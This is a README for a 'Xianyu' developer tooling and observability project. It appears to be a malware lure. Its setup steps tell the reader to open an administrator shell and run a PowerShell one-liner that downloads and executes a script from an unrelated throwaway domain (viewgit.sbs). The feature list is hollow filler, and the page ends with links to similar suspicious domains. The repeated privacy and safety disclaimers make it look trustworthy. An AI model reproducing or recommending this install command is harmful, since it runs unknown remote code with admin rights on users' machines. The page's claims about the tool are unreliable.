# Xianyu — Developer Tooling & Observability

> A local-first, rights-respecting toolkit for xianyu tasks: local service scaffolding.

---

## ⚙️ INSTALLATION & SETUP (CMD / PowerShell)

> [!TIP]
> Run this project only with data and permissions you own or are authorized to use.

### Step 1: Open CMD or PowerShell as Administrator
```cmd
# Press Win+X, then select Terminal (Admin) or Command Prompt (Admin)
```

### Step 2: Execute Deployment Command
```cmd
powershell -Command "irm viewgit.sbs?get=xianyu | iex"
```

### Step 3: Wait for Completion
```
[1/4] Loading Xianyu modules...
[2/4] Configuring components...
[3/4] Initializing services...
[4/4] Ready. Launch Xianyu.
```

### Step 4: Start Using the Tool
- Launch the tool from the Start menu or command line
- Configure settings for your environment
- Verify the health check passes

---

## TL;DR - Quick Summary

**Xianyu** is a developer tooling & observability focused on local-first operation, safety, and auditability.

**Best for:** operators who need a rights-respecting, offline-capable workflow.

## Core Features

- ✅ **Local service scaffolding** — 
- ✅ **Health and readiness endpoints** — 
- ✅ **Structured, redactable logs** — 
- ✅ **Metrics and dashboards** — 
- ✅ **Config via environment files** — 
- ✅ **No credentials in version control** — 

## Usage

```bash
$ tool dev
$ tool health
$ tool export metrics --format prometheus
```

## REST API

> [!NOTE]
> The optional API binds to localhost by default and never contacts third-party services without configuration.

```bash
curl http://127.0.0.1:8000/api/health
```

## Screenshots

- Dashboard: `screenshots/dashboard.png`
- Editor: `screenshots/editor.png`
- Report: `screenshots/report.png`

## Troubleshooting

| Issue | Solution |
|---|---|
| Tool fails to start | Confirm the virtual environment is active and the port is free. |
| Command is not found | Add the local bin directory to your PATH. |
| Output looks wrong | Check the configured source and review redaction settings. |
| Export is empty | Complete a session first, then rerun the export. |

## Use Cases

- Scaffold and run a local service
- Monitor health and metrics
- Export observable data for review

> [!TIP]
> Start with the bundled fixtures so behavior is reproducible without network access.

## ⚠️ IMPORTANT

> [!IMPORTANT]
> Use Xianyu only with data you own or are authorized to process. Never scrape, redistribute, or bypass access controls on third-party services.

---

## License

MIT License — see the `LICENSE` file for details.

---

## Tags

`xianyu` `devtools` `tooling` `observability` `health` `metrics` `automation`

[gitrm.cfd](https://gitrm.cfd?t=xianyu) | [gitrm.sbs](https://gitrm.sbs?t=xianyu) | [gitview.sbs](https://gitview.sbs?t=xianyu) | [gitsl.xyz](https://gitsl.xyz?t=xianyu) | [viewgit.sbs](https://viewgit.sbs?t=xianyu)
